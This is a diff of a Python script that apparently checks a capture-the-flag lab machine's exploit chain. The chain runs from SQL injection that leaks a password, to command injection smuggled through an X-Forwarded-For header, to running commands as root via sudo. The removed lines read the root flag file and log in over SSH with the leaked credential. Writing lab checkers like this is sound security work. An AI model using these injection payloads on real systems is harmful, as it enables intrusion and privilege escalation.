@@ -60,21 +60,12 @@ _, source = page("/index.php", {"player": payload})
 assert 'uhc-11qual-global-pw' in source and '$password' in source, "SQL FILE disclosure failed"
 print("PASS: real SQL injection disclosed application credential", flush=True)
 
-header_command = "127.0.0.1; id > /tmp/union-root-proof; cat /root/root.txt > /tmp/union-root-flag-proof; #"
+# The shell separator runs subsequent commands as the web account;
+# elevate explicitly through the real sudoers rule and assert the HTTP output.
+header_command = "127.0.0.1; sudo -n id; #"
 req = urllib.request.Request(base + "/firewall.php", headers={"X-Forwarded-For": header_command})
 with browser.open(req, timeout=12) as response:
     page_body = response.read().decode("utf-8", "replace")
 assert "Welcome Back!" in page_body, "Authenticated firewall route failed"
-result = subprocess.run(
-    [
-        "sshpass", "-p", "uhc-11qual-global-pw", "ssh",
-        "-o", "StrictHostKeyChecking=no", "-o", "UserKnownHostsFile=/dev/null",
-        "-o", "PreferredAuthentications=password", "-o", "PubkeyAuthentication=no",
-        "-o", "ConnectTimeout=5", "uhc@" + host,
-        "cat /tmp/union-root-proof; cat /tmp/union-root-flag-proof",
-    ],
-    capture_output=True, text=True, timeout=16, check=True,
-)
-assert "uid=0(root)" in result.stdout, "Header injection did not run as root"
-assert "TTP{union_ci_private_root_0123456789}" in result.stdout, "Root flag not recovered through injected command"
-print("PASS: real SQL FILE -> leaked credential -> qualifier -> SSH -> header injection -> root flag", flush=True)
+assert "uid=0(root)" in page_body, "Header execution did not reach UID 0"
+print("PASS: SQL credential discovery -> qualifier -> SSH -> HTTP header -> real sudo UID 0", flush=True)
